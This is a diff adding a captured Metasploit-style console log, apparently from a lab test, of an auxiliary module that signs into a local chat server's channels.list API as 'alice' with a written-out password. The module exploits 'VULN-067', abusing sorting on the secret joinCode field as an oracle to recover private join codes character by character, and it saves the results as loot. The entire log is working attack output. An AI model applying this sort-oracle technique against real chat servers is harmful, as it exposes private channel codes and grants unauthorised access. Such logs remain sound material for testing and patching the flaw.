@@ -1,0 +1,20 @@
+Loaded 1 modules:
+    1 auxiliary modules
+RHOSTS => 127.0.0.1
+RPORT => 39649
+TARGETURI => /api/v1/channels.list
+SSL => false
+VERBOSE => true
+USERNAME => alice
+PASSWORD => Al1ce-Lab-Pass!
+SORTFIELD => joinCode
+[*] Running module against 127.0.0.1
+[*] 127.0.0.1:39649 - Signed in as alice (user id rSQxouLt89hux5j4J)
+[+] 127.0.0.1:39649 - VULN-067: exploited
+[+] 127.0.0.1:39649 - channels.list honoured a sort on the secret 'joinCode' field
+[*]   ascending order : GENERAL, 6b047a6ce7422a44df31cacd, 6b056967e7422a44df31cf94, 6b05d014e7422a44df31e14e, 6b05d015e7422a44df31e155, 6b05d2a0e7422a44df31e229, 6b05cafbe7422a44df31e083, 6b05cafbe7422a44df31e085
+[*]   descending order: 6b05cafbe7422a44df31e081, 6b05cafbe7422a44df31e085, 6b05cafbe7422a44df31e083, GENERAL, 6b047a6ce7422a44df31cacd, 6b056967e7422a44df31cf94, 6b05d014e7422a44df31e14e, 6b05d015e7422a44df31e155
+[*]   the position of a probe channel between runs recovers the code one character at a time
+[+] 127.0.0.1:39649 - Saved the response to /tmp/.msf4/loot/20261124201018_default_127.0.0.1_blue_spider.vuln_153109.txt
+[*] Auxiliary module execution completed
+whoami: cannot find name for user ID 997
